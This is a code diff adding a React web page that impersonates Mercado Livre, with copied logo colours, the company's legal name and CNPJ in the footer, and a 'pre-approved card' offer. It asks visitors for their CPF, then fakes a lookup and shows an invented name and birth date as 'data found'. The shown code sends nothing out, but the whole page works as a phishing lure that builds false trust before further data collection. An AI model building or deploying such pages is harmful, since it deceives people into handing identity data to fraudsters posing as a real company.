@@ -1,0 +1,174 @@
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { useState } from "react";
+
+export const Route = createFileRoute("/validacao")({
+  head: () => ({
+    meta: [
+      { title: "Validação - Preencha seus dados" },
+      { name: "description", content: "Preencha seu CPF para continuar o cadastro do cartão pré-aprovado." },
+    ],
+    links: [
+      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
+    ],
+  }),
+  component: Validacao,
+});
+
+function formatCPF(v: string) {
+  const d = v.replace(/\D/g, "").slice(0, 11);
+  return d
+    .replace(/(\d{3})(\d)/, "$1.$2")
+    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
+    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
+}
+
+const SAMPLE_NAMES = [
+  "MARIA SILVA SANTOS",
+  "JOÃO PEREIRA OLIVEIRA",
+  "ANA CAROLINA SOUZA",
+  "CARLOS EDUARDO LIMA",
+  "FERNANDA COSTA RIBEIRO",
+  "LUCAS ALMEIDA MARTINS",
+];
+
+function mockDataFromCPF(cpf: string) {
+  const digits = cpf.replace(/\D/g, "");
+  const seed = digits.split("").reduce((a, c) => a + Number(c), 0);
+  const name = SAMPLE_NAMES[seed % SAMPLE_NAMES.length];
+  const day = String(((seed * 7) % 28) + 1).padStart(2, "0");
+  const month = String(((seed * 3) % 12) + 1).padStart(2, "0");
+  const year = 1960 + (seed % 40);
+  return { name, birth: `${day}/${month}/${year}` };
+}
+
+type Screen = "form" | "loading" | "success";
+
+function Validacao() {
+  const navigate = useNavigate();
+  const [cpf, setCpf] = useState("");
+  const [screen, setScreen] = useState<Screen>("form");
+  const [data, setData] = useState<{ name: string; birth: string } | null>(null);
+  const [error, setError] = useState("");
+
+  const handleContinue = () => {
+    const digits = cpf.replace(/\D/g, "");
+    if (digits.length !== 11) {
+      setError("Digite um CPF válido com 11 dígitos");
+      return;
+    }
+    setError("");
+    setScreen("loading");
+    setTimeout(() => {
+      setData(mockDataFromCPF(cpf));
+      setScreen("success");
+    }, 2500);
+  };
+
+  return (
+    <div className="min-h-screen bg-[#EEEEEE] flex flex-col relative overflow-hidden">
+      {/* Header */}
+      <div className="bg-[#FFE600] w-full py-4 flex justify-center items-center gap-2 shadow-sm">
+        <svg viewBox="0 0 60 40" className="h-9 w-12" xmlns="http://www.w3.org/2000/svg">
+          <ellipse cx="30" cy="22" rx="28" ry="14" fill="#FFE600" stroke="#2D3277" strokeWidth="1.5" />
+          <path d="M14 20 q8 -10 16 0 q8 10 16 0" stroke="#2D3277" strokeWidth="3" fill="none" strokeLinecap="round" />
+          <circle cx="20" cy="20" r="3" fill="#2D3277" />
+          <circle cx="40" cy="20" r="3" fill="#2D3277" />
+        </svg>
+        <span className="text-[#2D3277] font-bold leading-tight">
+          mercado
+          <br />
+          livre
+        </span>
+      </div>
+
+      {/* Decorations */}
+      <div className="absolute top-40 -left-20 w-64 h-64 rounded-full bg-white/40 pointer-events-none" />
+      <div className="absolute top-32 -right-24 w-80 h-80 rounded-full bg-white/40 pointer-events-none" />
+      <div className="absolute bottom-32 left-1/3 w-48 h-48 rounded-full bg-white/40 pointer-events-none" />
+
+      {/* Content */}
+      <main className="flex-1 flex items-start justify-center px-4 py-10 relative z-10">
+        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6">
+          {screen === "form" && (
+            <>
+              <h1 className="text-xl font-semibold text-gray-800 mb-6">
+                Preencha seus dados para cadastro
+              </h1>
+              <label className="block text-sm font-medium text-gray-700 mb-2" htmlFor="cpf">
+                CPF
+              </label>
+              <input
+                id="cpf"
+                type="tel"
+                inputMode="numeric"
+                placeholder="000.000.000-00"
+                value={cpf}
+                onChange={(e) => setCpf(formatCPF(e.target.value))}
+                className="w-full border border-gray-300 rounded-md px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#3483FA] focus:border-transparent"
+              />
+              {error && <p className="text-sm text-red-600 mt-2">{error}</p>}
+              <button
+                onClick={handleContinue}
+                className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 transition-all"
+              >
+                Continuar
+              </button>
+            </>
+          )}
+
+          {screen === "loading" && (
+            <div className="flex flex-col items-center py-6">
+              <div className="w-14 h-14 border-4 border-gray-200 border-t-[#3483FA] rounded-full animate-spin mb-6" />
+              <h1 className="text-xl font-semibold text-gray-800 text-center">
+                Estamos procurando seus dados
+              </h1>
+            </div>
+          )}
+
+          {screen === "success" && data && (
+            <>
+              <div className="flex flex-col items-center mb-6">
+                <div className="w-14 h-14 rounded-full bg-[#00A650] flex items-center justify-center mb-3">
+                  <i className="fas fa-check text-white text-2xl" />
+                </div>
+                <div className="text-lg font-semibold text-[#00A650]">
+                  Dados encontrados com sucesso!
+                </div>
+              </div>
+              <div className="bg-gray-50 rounded-lg p-4 mb-6 space-y-3">
+                <div className="flex justify-between text-sm">
+                  <span className="text-gray-600">Nome:</span>
+                  <span className="font-semibold text-gray-800">{data.name}</span>
+                </div>
+                <div className="flex justify-between text-sm">
+                  <span className="text-gray-600">Data de Nascimento:</span>
+                  <span className="font-semibold text-gray-800">{data.birth}</span>
+                </div>
+                <div className="flex justify-between text-sm">
+                  <span className="text-gray-600">CPF:</span>
+                  <span className="font-semibold text-gray-800">{cpf}</span>
+                </div>
+              </div>
+              <button
+                onClick={() => navigate({ to: "/" })}
+                className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md transition-all"
+              >
+                Continuar
+              </button>
+            </>
+          )}
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p className="mt-1">
+          CNPJ: 10.573.521/0001-91 ·{" "}
+          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
+          <a href="#" className="text-[#3483FA]">Privacidade</a>
+        </p>
+      </footer>
+    </div>
+  );
+}
